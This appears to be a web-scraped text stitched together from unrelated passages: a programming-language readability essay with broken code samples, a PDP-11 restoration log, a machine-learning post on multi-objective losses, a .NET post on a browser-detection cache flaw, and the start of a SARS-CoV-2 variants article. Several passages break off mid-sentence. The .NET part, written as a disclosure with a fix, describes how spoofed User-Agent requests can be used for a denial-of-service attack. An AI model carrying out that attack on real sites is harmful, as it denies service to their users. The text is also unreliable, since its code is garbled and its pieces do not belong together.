<p><code>(2)</code> is conceptually cleaner (no memorization of
<a href="https://en.wikipedia.org/wiki/Order_of_operations">PEMDAS</a> required), but it’s
also significantly less apparent to someone who’s already gone through
basic arithmetic with infix notation.</p>

<p>These are simple examples, but I think that they demonstrate a truth in
language design that we’re often not willing to admit, namely that precedent
and apparency matter more than conceptual purity. It’s nice to think of
radically new languages the reimagine common operations in</p>

<h3 id="complexity-of-mental-representation">Complexity of mental representation.</h3>

<p>This ties closely into apparent meaning, although it’s slightly different.</p>

<p>Consider each of the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>for</span><span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>foobar</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++)</span> <span>{</span>
	<span>foobar</span><span>[</span><span>i</span><span>].</span><span>baz</span><span>();</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>



<p>In both examples, I call <code>baz</code> on every element in the <code>foobar</code> array.</p>

<p>However, in the first one, I have to keep track of an index variable (<code>i</code>), a
loop condition and iteration (<code>i &lt; foobar.length; i++</code>), and a new scope (<code>{}</code>).</p>

<p>In the second one, I take advantage of a little bit of magic in the form of
an <code>each</code> method and a <code>:baz</code> symbol to reduce <em>N</em> operations to a single line.
I don’t have to worry about my index variable, the correctness of my condition,
or my scope.</p>

<p>Although <code>(1)</code> is probably more immediately <em>apparent</em> and much more similar
to currently popular styles, it also requires me to maintain a mental
representation of <em>details irrelevant to what I’m actually trying to
accomplish</em>. I don’t want (or need) to know <em>how</em> each element is accessed or
that there are <code>foobar.length</code> elements, I just want to apply <code>baz</code>.</p>

<h2 id="writability">Writability</h2>

<p>A programming language’s writability is closely related to its readability.
The readability of a language refers to analyzing idiomatic programs written by
<em>everybody</em>, while the writability of a language refers to an <em>individual’s</em>
ability to <em>produce</em> idiomatic programs.</p>

<p>My thoughts on writability fall into a few already well-defined categories:</p>

<h3 id="pola">POLA</h3>

<p>POLA stands for the
<a href="https://en.wikipedia.org/wiki/Principle_of_least_astonishment">Principle of Least Astonishment</a>.</p>

<p>It’s hard to think of a language that is uniformly unastonishing (in a good
way!), but I often point to Ruby as one that <em>can</em> be unastonishing.</p>

<p>Ruby’s <a href="http://ruby-doc.org/core-2.3.0/Array.html">Array</a> class is a good
example of this. Compare the following code snippets:</p>

<h4 id="testing-an-array-for-emptiness">Testing an array for emptiness</h4>

<p>Python:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

<span>not</span> <span>foobar</span> <span># =&gt; True
# OR
</span><span>len</span><span>(</span><span>foobar</span><span>)</span> <span>==</span> <span>0</span> <span># =&gt; True
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Java:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

</pre></td><td><pre><span>foobar</span> <span>=</span> <span>{};</span>

<span>foobar</span><span>.</span><span>length</span> <span>==</span> <span>0</span> <span>// =&gt; true</span>
</pre></td></tr></tbody></table></code></pre></div></div>

</pre></td><td><pre><span>foobar</span> <span>=</span> <span>[]</span>

<span>foobar</span><span>.</span><span>empty?</span> <span># =&gt; true</span>

<h4 id="testing-an-array-for-element-inclusion">Testing an array for element inclusion</h4>

<p>Python:</p>

<span>6</span> <span>in</span> <span>foobar</span> <span># =&gt; False
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Java:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>{</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>};</span>
<span>found</span> <span>=</span> <span>false</span><span>;</span>

<span>for</span> <span>(</span><span>i</span> <span>:</span> <span>foobar</span><span>)</span> <span>{</span>
	<span>if</span> <span>(</span><span>i</span> <span>==</span> <span>6</span><span>)</span> <span>{</span>
		<span>found</span> <span>=</span> <span>true</span><span>;</span>
		<span>break</span><span>;</span>
	<span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ruby:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>[</span><span>1</span><span>..</span><span>5</span><span>]</span>

<span>foobar</span><span>.</span><span>include?</span><span>(</span><span>6</span><span>)</span> <span># =&gt; false</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In both examples, the Ruby solution is fairly unastonishing. Predicates are
trailed by “<code>?</code>”, and are single English words corresponding to their behavior.</p>

<p>The Python examples tend to be equally short, but not as unastonishing.
<code>not foobar</code> relies on empty arrays being considered falsey (just be careful
with tuples!). Checking the length is not particularly astonishing (aside from
<code>len()</code> being called from the global namespace), but “the size of <code>foobar</code> is
zero” is an awfully roundabout way of saying “<code>foobar</code> is empty”.</p>

<p>The first Java example is about as short and astonishing as its Python
counterpart. The second one, on the other hand, is absolutely insane. It
could be shortened by using a helper like <code>Arrays.asList(foobar).contains(6)</code>,
except that this is invalid (primitives and Java generics don’t mix) and
also completely astonishing (an <code>Arrays</code> class? <code>asList</code>?).</p>

<p><a href="https://en.wikipedia.org/wiki/There's_more_than_one_way_to_do_it">There’s more than one way to do it</a>
is a longstanding Perl principle. People don’t often think of Perl when it
comes to <em>readability</em>, but I would argue that it is one of the most
<em>writable</em> languages (perhaps even
<a href="https://en.wikipedia.org/wiki/Write-only_language">write-only</a>).</p>

<p>Some examples:</p>

<h4 id="a-read-loop-that-capitalizes-input-and-spits-it-back">A read-loop that capitalizes input and spits it back</h4>

<p>In C, this would involve buffering <code>stdin</code> in a loop, converting each character
to its uppercase equivalent (don’t forget Unicode!), and printing them back out.
The process in Java would be similar.</p>

<p>In Perl:</p>



<p>a little more explicitly (and off of the command line):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>while</span> <span>(</span><span>&lt;&gt;</span><span>)</span> <span>{</span>
	<span>print</span> <span>uc</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>even more explicit:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>while</span> <span>(</span><span>my</span> <span>$line</span> <span>=</span> <span>&lt;</span><span>STDIN</span><span>&gt;</span><span>)</span> <span>{</span>
	<span>print</span> <span>uc</span><span>(</span><span>$line</span><span>);</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>and so on:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>while</span> <span>(</span><span>my</span> <span>$line</span> <span>=</span> <span>readline</span><span>(</span><span>*STDIN</span><span>))</span> <span>{</span>
	<span>print</span> <span>uc</span><span>(</span><span>$line</span><span>));</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Although this may seem like a shortcut to terse and unreadable code, it
<em>is</em> a legitimate reason to like a language (and enjoy writing in it). Perl
provides an astounding number of primitives and shortcuts for common operations
(<a href="http://perldoc.perl.org/perlop.html">look at all of these operators!</a>), making
quick scripting painless and straightforward.</p>

<p>(By the way, the Ruby version: <code>ruby -pe '$_.upcase!'</code>).</p>

<h2 id="executability">Executability</h2>

<p>This is probably the murkiest of the three “bits”.</p>

<p>Let’s clarify it:</p>

<h3 id="ease-of-setup">Ease of setup</h3>

<p>Let’s say I found a cool program written in “Etaoin”. How am I going to run it?</p>

<p>If Etaoin is compiled and the developer was kind enough to provide a package
or installer, I’d probably just download their package and let my system take
care of the little details. The is the <strong>best case scenario</strong>.</p>

<p>But what if Etaoin is interpreted? Well, the developer <em>might</em> bundle the
interpreter into a package, but this would be a bit overkill. It would probably
be better to install Etaoin discretely, a process that involves either a package
or manual compilation, depending on Etaoin’s popularity.</p>

<p>Once I’ve got the interpreter, what about the program’s dependencies? Does
Etaoin have a package manager? Are the dependencies available through it? Are
they compatible with my release of the language? Am I going to need other
languages and tools to build them?</p>

<p>Whenever I see a new language or an interesting project written in a new
language, these are the very first questions I ask. It’s a lot harder to
justify installing a relatively simple program If it requires me to manually
build an interpreter and dependencies, solely by virtue of being written in an
uncommon language.</p>

<p>Of course, this is not a completely fair or accurate characterization. It’s a
little ridiculous to place the onus of “executability” solely upon package
maintainers.</p>

<h3 id="integration-with-the-system">Integration with the system</h3>

<p>Now that I have Etaoin all set up, it’s time to run this cool program.</p>

<p>But wait, Etaoin programs run in a virtual machine that needs to be invoked:</p>

The output capacitor for 5V was in worse shape. A 3900 uF / 6VDC Sprague with impressive connectors never managed to get to the nominal voltage even using a 560 ohm resistor and plenty of time. <br></span></p><p><span face="verdana, sans-serif">&nbsp;<p><a href="http://i.imgur.com/O4FWlpH.png" imageanchor="1"><img alt="Capacitor replacement" src="http://i.imgur.com/O4FWlpH.png"></a></p><br><span><img alt="Zooma in (verklig storlek: 800 x 598)" src="http://elektronikforumet.com/forum/images/spacer.gif" title="Zooma in (verklig storlek: 800 x 598)"></span><p>Nowadays there are no such capacitors as 3900 uF / 6VDC with screw connectors so I replaced it with a 6800uF / 40VDC RIFA&nbsp; </p></span></p><p><span face="verdana, sans-serif">With a new capacitor the power supply managed well to deliver 3 Amps in my dummy load which after while smelt nicely from hot pertinax<br></span></p><p><span face="verdana, sans-serif"><p><a href="http://i.imgur.com/3v9ATUo.jpg" imageanchor="1"><img alt="test" src="http://i.imgur.com/3v9ATUo.jpg"></a></p><br><span><img alt="Zooma in (verklig storlek: 1000 x 747)" src="http://elektronikforumet.com/forum/images/spacer.gif" title="Zooma in (verklig storlek: 1000 x 747)"></span><p>But does the it work if one connects the power supply to the back plane? Unfortunately it doesn't. Apparently two signals from the power supply was permanently in low state, BUS DC LO L and BUS AC LO L. These are active low signals and in its' low state the inhibits the clock generation of the main CPU.</p></span></p><p><span face="verdana, sans-serif">The schematics above describes the 5V regulator of the H777 power supply. The blue marked area is a current source circuit which is fed by incoming raw DC and which charges a 50uF capacitor which thus creates a nice ramp signal. A resistor ladder circuit and a number of comparators generate the BUS DC LO L, BUS AC LO L and an internal signal which causes the clock signal to the main PWM switch. The voltage over the capacitor never exceeded 20.4 V which was not enough to get the two of the comparators to change polarity. It seems like to much current is consumed from the current source. The capacitor was replaced, but no difference. But the current source was not only connected to the capacitor. It was also connected to the red marked area which is a crow bar circuit. If any of the main switch transistors would fail a 38 V raw DC would be the result on the output. Not very good. Therefore there is a zener diode and a couple of thyristors which fires off if the output voltage exceeded 5.6 VDC. This will also short circuit the current source, effectively stopping all activities in&nbsp; power supply. The problem seemed to be that even under normal circumstances 1.5 mA was consumed by leakage in the thyristor even though hasn't fired. Apparently all thyristors have leakages but not this much.<p><a href="http://i.imgur.com/U0GunMu.png" imageanchor="1"><img alt="Thyristor" height="389" src="http://i.imgur.com/U0GunMu.png" width="400"></a></p><p>Change of thyristor to a modern BT145 resulted in a fully functional power supply!</p><p><span>Testing the CPU</span></p><p>All cables were connected and the power was switched on. No smoke leaked anywhere which was a good sign. But the RUN lamp were just flashing briefly. Pressing INIT switch on the console only gave a short blink of the RUN lamp. Not very promising.</p><p>A check with the oscilloscope on the main clock signal of then CPU board showed that is starts up does 8 cycles, the stops for a couple micro seconds then does three more cycles, yet another stop and the three cycles and then nothing.</p><p><span><img alt="Zooma in (verklig storlek: 1200 x 961)" src="http://elektronikforumet.com/forum/images/spacer.gif" title="Zooma in (verklig storlek: 1200 x 961)"></span></p><p><a href="http://i.imgur.com/O3QASBs.png" imageanchor="1"><img alt="8 micro cycles" src="http://i.imgur.com/O3QASBs.png"></a></p><br>From the picture above one can deduce that the cycle time is closer to 250 ns rather than 260 ns&nbsp; specified in "Computer Engineering". However using a delay line in a feedback loop may not be that accurate. 4 MHz is a quite impressive speed at least in the mid seventies. </span></p><p><span face="verdana, sans-serif">Further than this is probably not possible using an oscilloscope only. For that purpose I have gotten this little USB connected tool:<br></span></p><p><span face="verdana, sans-serif">But to cover the entire machine with address and data bus one would need four of these. Luckily at this point in time I was offered to buy a HP1664A logic analyser at an affordable price!<br></span></p><div><p><span face="verdana, sans-serif"><b>Logic&nbsp;analyser&nbsp;fault tracing</b></span></p><p><span face="verdana, sans-serif">After some initial problems which was caused by mixed-up signals and also forgetting that the machine is active low I got some good traces from the analyser:<br></span></p><div><p><span face="verdana, sans-serif"><p><a href="http://i.imgur.com/SPIxi1B.png" imageanchor="1"><img alt="micro code" src="http://i.imgur.com/SPIxi1B.png"></a></p><p>The picture above shows the output of the micro address pipeline register. So it actually shows the second micro step as the first micro-step. But this is actually the correct sequence comparing to this <a href="http://vaxhaven.com/images/1/11/EK-KD11D-TM-PRE.pdf">document</a>. </p><p><a href="http://i.imgur.com/vCoTm8v.png" imageanchor="1"><img alt="Address bus and databus" src="http://i.imgur.com/vCoTm8v.png"></a></p><br>The interesting with this trace is that the CPU output addresses 24 and the 26 on the address bus. On the data bus it then receives 165020 which is the to be PC to start execution at after power fail, this is also the first address of the diagnostics program of the M9312. But looking at the address the CPU subsequently outputs on the address bus it is 167020. For some reason bit 10 has became high! Measuring more closely on a bus receiver chip, DS8641 shows that even though the input is at 3.31 V the output is a 3.78 V! This seems to be wrong!</span></p><p><span><span face="verdana, sans-serif">It is alive</span></span></p><p><span face="verdana, sans-serif"><b><br></b>This is the little evil thing:<p><a href="http://i.imgur.com/XojS9FU.png" imageanchor="1"><img alt="DS8641" height="320" src="http://i.imgur.com/XojS9FU.png" width="319"></a></p><br>Unfortunately DS8641 is not a very common IC. It is especially adapted to Digital open collector buses. I ordered some from a seller on Ebay located in China but since the delivery time is quite long I resorted to desoldered an IC from another board and replaced the faulty chip on the CPU board.<p>This time the result was much better:</p></span></p><p><span face="verdana, sans-serif"><p><a href="http://i.imgur.com/soZUSxo.png" imageanchor="1"><img alt="Waiting for TX ready" src="http://i.imgur.com/soZUSxo.png"></a></p><br>However it ends up spinning waiting for TX ready bit of the console serial port to become ready.

<p><b><span face="verdana, sans-serif">Running diagnostics</span></b></p></div><p><span face="verdana, sans-serif">To really check that the CPU was working as it should there are two diagnostics to run. These are GKAA and GKAB. There are actually two ways to run them. Either you have an image of the paper tape which you load by PDP11GUI or you run the XXDP environment. I tried both ways.&nbsp;</span></p><p><span face="verdana, sans-serif">Originally these are paper tape software but unfortunately I was unable to find images of these paper tapes. But I did find a XXDP image with the GKAAA0.BIC and GKABC0.BIC on them. It turns out that these binaries in reality has exactly the same format as a paper tape. I used the <a href="http://www.dbit.com/putr/">PUTR</a>&nbsp;tool to extract them from the image. Please make sure to copy them as binary otherwise you end up like me scratching my head for hours... I then used PDP11GUI to load them into memory and starting them at address 200.&nbsp;</span></p><p><b><span face="verdana, sans-serif">Booting XXDP</span></b></p><p><span face="verdana, sans-serif">XXDP needs to be booted from some kind of mass storage. The only thing than would be quite easy to get running on the machine right now is TU58 since it is using a standard serial port to connect to the drive. The drive itself can be emulated using a PC or MAC. I downloaded&nbsp;<a href="http://www.ak6dn.com/PDP-11/TU58/tu58em/index.html">tu58em</a>&nbsp;and compiled it on my Mac. It needed just a few modifications to the serial port code to compile cleanly.</span></p><p><span face="verdana, sans-serif">Then I started the work to get a bootable TU58 image for my TU58 emulator. It is far simpler to use an emulator to all this kind of work. I used&nbsp;<a href="http://www.dbit.com/">E11</a>&nbsp;to do all this. First I tried XXDP 2.6 which I found an image for on bitsavers:</span></p><p><span face="verdana, sans-serif">Unfortunately it required more memory than my machine had so it won't be possible to run this version. Besides the GKAB diagnostics doesn't run at all on the emulated PDP-11/04 for some reason!</span></p><p><span face="verdana, sans-serif">I then spent some time to make a TU58 image for XXDP+, an earlier version of the XXDP suite.</span></p><p><span face="verdana, sans-serif">This is how I did that using E11:</span></p><p><span face="verdana, sans-serif">Running GKAAA0.BIC under XXDP+ on the real machine works fine. Most of the machine is in perfect order!

It is impossible to find a listing for this diagnostic but the PDP-11/34 version is very similar. Looking through the <a href="http://bitsavers.informatik.uni-stuttgart.de/pdf/dec/pdp11/xxdp/diag_listings/1134/AC-8045D-MC_CFKABD0-1134-Traps-Tst_Apr77.pdf">code</a>&nbsp;gives that the section where it halts is testing the stack overflow logic in the CPU. It does this by setting the stack pointer to 400 and then enable console TX interrupts. This will cause an immediate TX interrupt to occur. This will decrement the stack pointer below 400 and immediately trigger a trap to vector 4/6. My machine on the other hand will trigger new console interrupts until the stack wraps to 177774 (where there are no memory) and then halt with a double bus fault!</span></p><p><b><span face="verdana, sans-serif">Faulty DL11-W!</span></b></p><p><span face="verdana, sans-serif">By swapping cards I found that the using a replacement DL11-W the problem vanished.

In fact, they are commonly used as the standard approach, despite that they are a perilous area full of dicey pitfalls. Especially regarding how these linear combinations make your algorithm hard to tune.</p><p>Therefore, in this post we hope to lay out the following arguments:</p><ul><li>A lot of problems in machine learning should be treated as multi-objective problems, while they currently are not.</li><li>This lack of multi-objective treatment leads to difficulties in tuning the hyper-parameters for these machine learning algorithms.</li><li>It is nigh on impossible to detect when these problems are occurring, making it tricky to work around them.</li><li>There are methods to solve this which might be slightly involved, but do not require more than a few lines of code. <a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">One of these methods is laid out in a follow-up blog post.</a></li></ul><p>Nothing of this article is novel. You might already be aware of everything we wanted to say. However, we have the impression that most machine learning curricula do not discuss optimisation methods very well (I know mine did not), and consequently, gradient descent is being treated as the one method to solve all problems. And the general message is that if an algorithm does not work for your problem, you need to spend more time tuning the hyper-parameters to your problem. </p><p><a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">In the next blog post, a solution is introduced</a>, based on the NIPS’88 paper which introduced the Modified Differential Method of Multipliers.</p><p>So we hope that this blogpost can remove some confusion on how to handle this issue in a more foundational and principled way. And hey, maybe it can make you spend less time tuning your algorithms, and more time making research progress.</p><h2 id="linear-combinations-of-losses-are-everywhere">Linear combinations of losses are everywhere</h2><p>While there are single-objective problems, it is common for these objectives to be given additional regularisation. We have picked a selection of such optimisation objectives from across the field of machine learning field.</p><p>First off, we have the regularisers, weight decay and lasso. It is obvious that when you add these regularisations, you effectively have created a multi-objective loss for your problem. After all, what you really care about, is that both the original loss \(L_0\) and the regulariser loss are kept low. And you will tune the balance between the two using a \(\lambda\) parameter.</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \left| \theta \right| $$</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \theta^2 $$</p><p>As a consequence, losses found in e.g. VAE’s are effectively multi-objective, with a first objective to maximally cover the data, and a second objective to stay close to the prior distribution. In this case, occasionally KL annealing is used to introduce a tunable parameter \(\beta\) to help handle the multi-objectiveness of this loss.</p><p>$$ L(\theta) =\mathbb{E}_{q_{\phi}(z | x )} \left[ \log p_\theta ( x | z) \right] &nbsp;- \beta D_{KL} \left( q_\phi ( z | x) \| p(z) \right) $$</p><p>Also in reinforcement learning, you can see this multi-objectiveness. Not only is it common for many environments to simply sum rewards received for obtaining partial goals. The policy loss is usually also a linear combination of losses. Take as an example here the losses on the policy for PPO, SAC and MPO, entropy regularized methods with their tunable parameter <strong><em>α</em></strong>.</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ r(s_t, a_t) + \alpha \mathcal{H}(\cdot , s_t)\right]$$</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ \mathbb{E}_\pi\left(Q(s_t, a_t)\right) - \alpha D_{KL} \left( q \| \pi \right) \right]$$</p><p>Finally, the GAN-loss is of course a sum between the discriminator and the generator loss:</p><p>$$ L(\theta) = - \mathbb{E}_x \left[ \log D_\theta(x)\right] - \mathbb{E}_z \left[ \log ( 1- D_\theta(G_\theta(z))\right]$$</p><p>All of these losses have something in common, they are effectively trying to optimise for multiple objectives simultaneously, and argue that the optimum is found in balancing these often contradicting forces. In some cases, the sum is more ad hoc and a hyper-parameter is introduced to weigh the parts against each other. In some cases, there are clear theoretical foundations on why the losses are combined this way, and no hyper-parameter is used for tuning the balance between the parts. </p><blockquote>In this post, we hope to show you this approach of combining losses may sound appealing, but that this linear combination is actually precarious and treacherous. The balancing act is often more like a tightrope walk.</blockquote><p>Let us consider a simple case, where we are trying to optimise for such a linear combination of losses. We take the approach of optimising the total loss, which is a sum of losses. We optimise this with gradient descent, and we observe the following behaviour.</p><figure><img src="https://lh5.googleusercontent.com/953U2daXgDAO_97ugiYVEKnbK69gZVKUmlY9hNpCqtYlTso-XFw8WQ-dWRcBNeNtx7KNvXi1bM5mB8cfmnjXUMg4gU6fp5LvADys1WtoWIW-mqiJt1Uzu-Lw8VceNfQeLLQa9IZa" alt=""></figure><p>Our code in Jax would look something like this:</p><pre><code>def loss(θ):
  return loss_1(θ) + loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ)
  θ = θ - 0.02 * gradient</code></pre><p>As is usually the case, we are not immediately happy about the tradeoff between the two losses. So we introduce a scaling coefficient <strong><em>α</em></strong> on the second loss and run the following code:</p><pre><code>def loss(θ, α):
  return loss_1(θ) + α*loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ, α=0.5)
  θ = θ - 0.02 * gradient
</code></pre><p>The behaviour we hope to see is that when tuning this <strong><em>α</em></strong>, we can choose the trade-off between the two losses and select the point we are most happy with for our application. We effectively will go on a hyper-parameter tuning loop, manually select an <strong><em>α</em></strong>, run the optimisation process, decide we would like the second loss to be lower, tune our <strong><em>α</em></strong> up accordingly and repeat the whole optimisation process. After several iterations, we settle for the solution we found and continue writing our papers.</p><p>However, that is not what is always happening. The actual behaviour we sometimes observe for our problem looks like the one below.</p><figure><img src="https://lh6.googleusercontent.com/iZlk4MRVx7JYgLbaqIv-jH8zZGSc78Jj-aqk_YWy5e80tf_hgMMaBn41yRFR2rpRFGE8vuRGWjljGZ6Ri8XbyDhZbAQbSCX-putykGEpxgmcuPTmrQH1VHKpaKfjra3AG4u-x9K7" alt=""></figure><blockquote>It seems that no matter how we finetune our <strong><em>α</em></strong>-parameter, we cannot make a good trade-off between our two losses. </blockquote><p>We see two clusters of solutions, one where the first loss is ignored, and one where the second loss is ignored. However, both of these solutions are not useful for most applications. Most of the time, a point where the two losses were more balanced is a more preferred solution.</p><p>In fact, this diagram of the two losses over the course of training is barely ever plotted, so the dynamics illustrated in this figure often goes unobserved. We just look at the training curve plotting the total loss, and we might conclude that this hyper-parameter needs more time tuning, as it seems to be really sensitive. Alternatively, we could settle for an approach of early stopping to make the numbers in the paper work. After all, reviewers love data efficiency.</p><p>Where did it go wrong though? <strong>Why does this method sometimes work, and why does it sometimes fail to give you a tunable parameter?</strong> For that, we need to look deeper into the difference between the two figures.</p><p>Both figures are generated for the same problem, using the same losses and are optimising these losses using the same optimisation method. So none of these aspects are to blame for the difference. The thing which has changed between these problems is the model. In other words, the effect the model parameters <strong><em>θ</em></strong> have on the output of the model is different.</p><p>Therefore, let us <em>cheat</em> and visualise something which is normally not visualisable, the Pareto front for both of our optimisations. This is the set of all solutions achievable by our model, which are not dominated by any other solution. In other words, it is the set of achievable losses, where there is no point where <em>all</em> of the losses are better. No matter how you choose to trade off between the two losses, your preferred solution always lies on the Pareto front. By tuning the hyper-parameter of your loss, you usually hope to merely find a different point on that same front.</p><figure><img src="https://lh6.googleusercontent.com/6qA_NcRMUK8mWT3j3-t_bPl-oZkwg5Q9lWcOgBn9IB3qF_yQ7p1dyH6eq_DtKpTGeACMsLE-YfiIY9DH3yhF7swsmMFGMjNwI_oHdKKbNTuO0M8a_oDZQTUhKGcEuAfTpomqHX-M" alt=""></figure><figure><img src="https://lh6.googleusercontent.com/kVqsudO8-j48MEsdlaZgDgc22jMO9myzwdbTTWQ-KufWjuXqIr9gNHKrgV-fRzTb5gMgDnO-sFp1z_lS3UhX3wjwXHRowiaO7Vp04ZaYEAthw7y6wyN3zltH3o0wgB5ZbTDjRuRb" alt=""></figure><p>The difference between the two Pareto fronts is what is causing the tuning to turn out well for the first case, but to fail horribly after changing our model. It turns out that when the Pareto front is convex, we can achieve all possible trade-offs by tuning our <strong><em>α</em></strong>-parameter. However, when the Pareto front is concave, that approach does not seem to work well anymore.</p><h2 id="why-does-gradient-descent-optimisation-fail-for-concave-pareto-fronts">Why does gradient descent optimisation fail for concave Pareto fronts?</h2><p>We can illustrate why that is the case, by looking at the total loss in the third dimension, the loss which is actually optimised with gradient descent. In the following figure, we visualise the plane of total loss in relation to each of the losses. While we actually descend on this plane using the gradient with respect to the parameters, each gradient descent step we take will also necessarily go downwards on this plane. You can imagine the gradient descent optimisation process as putting a spherical pebble on that plane, letting it wobble down under gravity and wait until it comes to a halt.</p><p>The point where the optimisation process halts is the result of the optimisation process, here indicated by a star. As you can see in the following figure, no matter how you wobble down the plane, you will always end up in the optimum.</p><figure><img src="https://lh4.googleusercontent.com/U43_rJCiufKMSZ4gtci5kTQ2DRIH_r8WyvFi0aFV0wjpxXTNSFnMzR8a9DHvBc_ONbi0rEIBfXRQXUSxAcriZDGBNWVRhMQ-ifaIXdgeNf1K6cEIeXzMjYZUk94EWMH_bOBzvhOa" alt=""></figure><p>By tuning <strong><em>α</em></strong>, this space stays a plane. After all, by changing <strong><em>α</em></strong>, we are only changing the tilt of this plane. As you can see, &nbsp;in the convex case any solution on the Pareto curve can be achieved by tuning <strong><em>α</em></strong>. A little more <strong><em>α</em></strong> pulls the star to the left, a little less <strong><em>α</em></strong> pushes the star to the right. Every starting point of the optimisation process will converge on the same solution, and that is true for all values of <strong><em>α</em></strong>.</p><figure><img src="https://engraved.ghost.io/content/images/2021/01/visualising_the_convex_case.mp4.hq.gif" alt=""></figure><p>However, if we take a look at the differently modeled problem with a concave Pareto front, it becomes apparent where …</p></div></section></div></div></div>

<p>Ever since .Net v4, in all versions including the last classic .Net version v4.8, the built-in browser detection accessible in the Request.Browser (a HttpBrowserCapabilities object) has a serious flaw which will bite you as soon as your site gets several visitors per minute.</p>



<p>What happens, if you rely on this object, is that users will randomly report having their browser mis-identified.</p>



<p>This post shows why it happens and how to solve it. The issue is also easy to reproduce locally, worth a few fun minutes. If you are so inclined, the problem also lends itself to a DoS attack.</p>



<p>Even though this problem seems only to affect classic .Net (not .Net Core), there is a huge number of running web apps out there, and still new being developed, on this framework.</p>



<p>We have a website relying on some of the later browser features, so we are using browser detection to tell users with older browsers to upgrade, since we absolutely need these features. It works fine for a while, then randomly, users with recent browser versions are suddenly told they need to upgrade. Once this occures it typically lasts for the rest of the day.</p>



<p>To reproduce, create an asp.net project (web forms, MVC, doesn’t really matter) with this code in a .aspx file:</p>



<pre><code>&lt;script language="c#" runat="server"&gt;
public void Page_Load(){
    Response.Write(Request.Browser.Browser 
    + " v" + Request.Browser.MajorVersion);
}
&lt;/script&gt;
</code></pre>



<p>Visit this page, locally or on a server, and you get for instance <code>Chrome v88</code>. So far, so good.</p>



<p>The browser is classified from the User-Agent HTTP header. My Chrome sends this: <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</code></p>



<p>Now, quickly change the <code>Chrome/88</code> in the middle of the string to <code>Chrome/86</code> (or any other number) and retry. For instance in Curl:</p>



<pre><code>curl http://localhost:58571 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4324.104 Safari/537.36"</code></pre>



<p>Still v88? How strange… Let’s refresh a few times. Still v88. Let’s think for a minute…hmm…refresh again. Gone! Now, at last, it shows v86! </p>



<p>I had to look into the <a href="https://referencesource.microsoft.com/System.Web/Configuration/HttpCapabilitiesEvaluator.cs.html#https://referencesource.microsoft.com/System.Web/Configuration/HttpCapabilitiesEvaluator.cs.html,3774a0750f8cc853,references">offending source code</a> from the .Net framework.</p>



<p>What happens is, for performance, the result of the browser classification is stored in a hash-table with the User-Agent string as the key. But not the entire string, no, that would have saved us a lot of headache, no, the key is just the first 64 characters (source line 46).</p>



<p>The Chrome version number is located at position 90 and thus not part of the key at all. To add to the frustration, the cache has a sliding-window (source line 247,304, 369) 1 minute expiry (source line 147). This means: as long as the cache key is read at least once a minute, it stays. Hilarity ensues.</p>



<p>The fix is straight-forward, put this in your <code>web.config</code></p>



<pre><code>&lt;configuration&gt;
    &lt;system.web&gt;
        &lt;browserCaps userAgentCacheKeyLength="512" /&gt;
    &lt;/system.web&gt;
&lt;/configuration&gt;</code></pre>



<p>Why 512? It turns out that .Net caps the User-Agent string at 512 characters  to avoid resource attacks (source line 188). I imagine someone at Microsoft deciding that 512 characters ought to be enough for anybody.</p>



<h2>Denial-of-Service implication</h2>



<p>Without this line in your web.config, your site is also vulnerable to a DoS attack if you, like us, rely on browser identification to enable some functionality. An attacker would wait for low-traffic hours, typically the middle of the night, to issue requests with the first 64 bytes looking like the most commonly used User-Agents on the web, but the rest of the string tweaked with low version numbers or other content to lead the browser capabilities to think “it’s an older browser, sir, but it checks out”.</p>



<p>As long as one request per User Agent is issued per minute, these are permanently mis-identified. An exceptionally low-cost and low-effort DoS attack.</p>

<p>In recent months variants of SARS-CoV-2 have been detected that are unusual in that they have many more genome mutations than previously found. These have been called ‘variants of concern’ (VOC) as it has been suggested that the genome mutations might impact transmission, immune control, and virulence. Below I cover each of these issues separately.</p>



<p><strong>Transmission</strong></p>



